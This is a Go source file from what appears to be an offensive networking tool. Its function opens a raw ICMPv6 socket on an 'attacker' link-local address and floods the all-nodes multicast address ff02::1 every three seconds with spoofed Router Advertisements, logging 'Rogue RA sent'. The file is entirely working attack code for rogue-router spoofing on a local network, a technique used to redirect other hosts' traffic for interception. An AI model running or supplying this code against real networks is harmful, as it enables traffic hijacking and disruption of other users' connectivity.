package dhcp6

import (
	"fmt"
	"net"
	"time"

	"github.com/fatih/color"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv6"
)

// Sending Router Advertisement
// header -> icmpv6 type: 134, src: attacker link-local address, dst: all-nodes multicast address -> ff02::1
// options -> IPV6 perfix,

func SendRouterAdvertisement(ifaceName string, attackerLinkLocal string) error {

	// open socket
	conn, err := net.ListenPacket("ip6:ipv6-icmp", attackerLinkLocal+"%"+ifaceName)

	if err != nil {
		return fmt.Errorf("Failed to open connection: %v", err)
	}

	defer conn.Close()

	p := ipv6.NewPacketConn(conn)
	p.SetHopLimit(255)
	p.SetMulticastHopLimit(255)

	// build the body
	body := []byte{
		64,         // hop limit
		0,          // flags
		0x07, 0x08, // lifetime = 1800 seconds
		0, 0, 0, 0, // reachable time
		0, 0, 0, 0, // retrans timer
	}

	// building the icmpv6 message
	msg := icmp.Message{
		Type: ipv6.ICMPTypeRouterAdvertisement,
		Code: 0,
		Body: &icmp.RawBody{Data: body},
	}

	// Serialize the message to bytes
	msgBytes, err := msg.Marshal(nil)

	if err != nil {
		return fmt.Errorf("failed to marshal ICMPv6 message: %v", err)
	}

	// Send packet to ff02::1
	dst := &net.IPAddr{IP: net.ParseIP("ff02::1"), Zone: ifaceName}

	// send the RA repeatedly every few seconds
	ticker := time.NewTicker(3 * time.Second)
	count := 0

	for range ticker.C {
		_, err := conn.WriteTo(msgBytes, dst)

		if err != nil {
			fmt.Printf("WriteTo error: %v\n", err)
		} else if count == 0 {
			color.Green("%-10s  %-16s → ff02::1\n", time.Now().Format("15:04:05"), "Rogue RA sent")
		}
		count++
	}

	return nil
}
